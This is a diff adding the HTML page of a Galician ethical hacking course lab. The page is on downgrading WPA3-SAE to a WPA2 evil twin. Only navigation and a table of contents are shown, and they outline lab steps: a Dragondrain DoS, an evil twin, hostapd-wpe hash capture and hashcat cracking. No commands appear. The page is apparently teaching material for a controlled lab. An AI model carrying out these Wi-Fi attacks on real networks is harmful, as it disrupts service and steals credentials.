@@ -1,0 +1,2295 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../wifite-3.2-ATAQUE_WPA3_KRACK/">
+      
+      
+        <link rel="next" href="../wifite-3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>WPA3 SAE downgrade WPA2 PSK EVIL TWIN - Hacking Ético - UD4 - O hacking ético nas redes sen fíos</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#guia-de-practica-33-dragonblood-dos-evil-twin-wpa2-psk-ou-evil-twin-wpa2-eap" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../../.." title="Hacking Ético - UD4 - O hacking ético nas redes sen fíos" class="md-header__button md-logo" aria-label="Hacking Ético - UD4 - O hacking ético nas redes sen fíos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD4 - O hacking ético nas redes sen fíos
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              WPA3 SAE downgrade WPA2 PSK EVIL TWIN
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../apuntamentos/modo-22000/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../wifi-psk/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD4
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Hacking Ético - UD4 - O hacking ético nas redes sen fíos" class="md-nav__button md-logo" aria-label="Hacking Ético - UD4 - O hacking ético nas redes sen fíos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD4 - O hacking ético nas redes sen fíos
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/modo-22000/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Formato WPA*02 (hashcat modo 22000)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/modo-5500/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Formato NetNTLMv1 (hashcat modo 5500)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio vuln-wifi.lab
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio vuln-wifi.lab
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../apuntamentos/GUIA_VISUAL_ATAQUES_WIFI_all/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía Visual de Ataques WiFi
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD4
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD4
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Wi-Fi
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Wi-Fi
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wifi-psk/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA2 (PSK)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wifi-eap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA2 (EAP)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wifi-sae/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA3 (SAE)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Vuln Lab Wi-Fi
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Vuln Lab Wi-Fi
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    README
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1_2" id="__nav_3_2_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-ATAQUE_WPA2_PSK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA2 PSK
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-1-ATAQUE_WPA2_PSK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    — wifite WPA2 PSK
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.2-ATAQUE_WPA2_PSK_PMF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA2 PSK PMF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-1.2-ATAQUE_WPA2_PSK_PMF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    — wifite WPA2 PSK PMF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.3-ATAQUE_WPA2_PSK_PMKID/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA2 PSK PMKID
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-1.3-ATAQUE_WPA2_PSK_PMKID/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    — wifite WPA2 PSK PMKID
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-ATAQUE_WPA2_EAP_EVIL_TWIN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA2 EAP EVIL TWIN
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-ATAQUE_WPA2_EAP_MITM/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA2 EAP MITM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-2.1-ATAQUE_WPA2_EAP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    — wifite WPA2 EAP  — NON SOPORTADO
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.1-ATAQUE_WPA3_SAE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA3 SAE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-3.1-ATAQUE_WPA3-SAE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    — wifite WPA3 SAE  — NON SOPORTADO
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.2-ATAQUE_WPA3_KRACK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA3 SAE KRACK
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-3.2-ATAQUE_WPA3_KRACK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    — wifite WPA3 SAE KRACK  — NON SOPORTADO
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    WPA3 SAE downgrade WPA2 PSK EVIL TWIN
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    WPA3 SAE downgrade WPA2 PSK EVIL TWIN
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-preparacion-do-escenario-terminais-1-e-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Preparación do Escenario (Terminais 1 e 2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-reconecemento-e-modo-monitor-terminais-1-e-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Recoñecemento e Modo Monitor (Terminais 1 e 2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-captura-e-intento-de-deauth-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Captura e Intento de Deauth (Terminal 1)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-ataque-dos-con-dragondrain-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Ataque DoS con Dragondrain (Terminal 2)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Ataque DoS con Dragondrain (Terminal 2)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#simulacion-da-caida-do-ap-pdf-pax-13-terminal-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Simulación da caída do AP (PDF: páx. 13) (Terminal 3)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-reconexion-do-cliente-ao-evil-twin-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Reconexión do Cliente ao Evil Twin (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cracking-do-handshake-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Cracking do Handshake (Terminal 1)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6b-variante-avanzada-evil-twin-wpa2-eap-jtrhashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      6b. Variante avanzada: Evil Twin WPA2-EAP + jtr/hashcat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6b. Variante avanzada: Evil Twin WPA2-EAP + jtr/hashcat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-parar-o-evil-twin-psk-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 1: Parar o Evil Twin PSK (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-verificar-e-preparar-certificados-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 2: Verificar e preparar certificados hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-preparar-wlan2-e-crear-configuracion-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 3: Preparar wlan2 e crear configuración hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-lanzar-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 4: Lanzar hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-5-reconectar-o-cliente-ao-evil-twin-wpa2-eap-terminal-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 5: Reconectar o cliente ao Evil Twin WPA2-EAP (Terminal 3)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-6-verificar-captura-do-hash-en-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 6: Verificar captura do hash en hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-7-extraer-o-hash-para-hascat-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 7: Extraer o hash para hascat (Terminal 1)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-8-crackear-con-hashcat-modo-5500-netntlmv1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 8: Crackear con hashcat (Modo 5500 — NetNTLMv1
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-9-mostrar-o-resultado" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 9: Mostrar o resultado
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comparativa-de-variantes-evil-twin" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comparativa de variantes Evil Twin
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-resumo-do-ataque-dos-evil-twin-wpa2-pskeap" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Resumo do Ataque (DoS + Evil Twin WPA2-PSK(EAP))
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-limpeza" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. Limpeza
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-preguntas-de-reflexion" class="md-nav__link">
+    <span class="md-ellipsis">
+      9. Preguntas de reflexión
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-comparativa-de-vectores-de-ataque-contra-wpa3-sae" class="md-nav__link">
+    <span class="md-ellipsis">
+      10. Comparativa de vectores de ataque contra WPA3-SAE
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wifite-3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    — wifite WPA3 SAE downgrade WPA2 PSK(EAP) EVIL TWIN  — NON SOPORTADO
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
